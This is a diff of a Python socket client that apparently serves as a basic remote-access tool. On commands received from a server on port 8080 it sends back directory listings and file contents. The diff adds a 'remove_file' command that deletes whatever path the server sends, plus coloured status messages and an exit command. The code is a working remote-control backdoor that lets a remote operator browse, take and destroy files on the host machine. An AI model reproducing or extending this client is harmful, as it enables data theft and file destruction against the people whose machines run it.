@@ -3,6 +3,9 @@
 
 import os
 import socket
+from colorama import Fore, init
+
+init()
 
 s = socket.socket() #socket instance
 port = 8080 
@@ -21,6 +24,7 @@ while True:
     if command == "getcwd":
         directory = str(os.getcwd()) #get actual directory        
         files = str(os.listdir(directory)) #get files for the actual directory
+        print(files, directory)
         s.send(directory.encode()) #send the info encoded to server script
         s.send(files.encode())
         print("\nCommand has been executed successfully...")
@@ -33,7 +37,7 @@ while True:
             s.send(files.encode())
             print("\nCommand has been executed succesfully...")
         except Exception as e:
-            error = str("Path not found, try again")
+            error = str("[{}*{}]Path not found, try again".format(Fore.LIGHTRED_EX,Fore.LIGHTWHITE_EX))
             s.send(error.encode())
             print("\nError has been sent")
 
@@ -48,7 +52,23 @@ while True:
             s.send(data) #send info
             print("\nFile has been sent successfully")
         except Exception as e:
-            print("error try again")                        
+            print("error try again")       
+
+    elif command == 'remove_file':
+        try:
+            userInput = s.recv(6000) #receive path file
+            userInput = userInput.decode()
+            os.remove(userInput) #remove file
+            print('\nCommand has been executed...') 
+            log = str('\n{}[{}+{}]File removed successfully...'.format(Fore.LIGHTWHITE_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
+            s.send(log.encode()) #send successfully message
+        except Exception as e: #if file doesnt exists
+            error = Fore.LIGHTWHITE_EX+'\n['+Fore.LIGHTRED_EX+'*'+Fore.LIGHTWHITE_EX+']'+'Error: ' + str(e)         
+            s.send(error.encode()) #send error message
+            print(error)
+
+    elif command == 'exit':
+        quit()
 
     else:
         print("\nCommand not recognised")
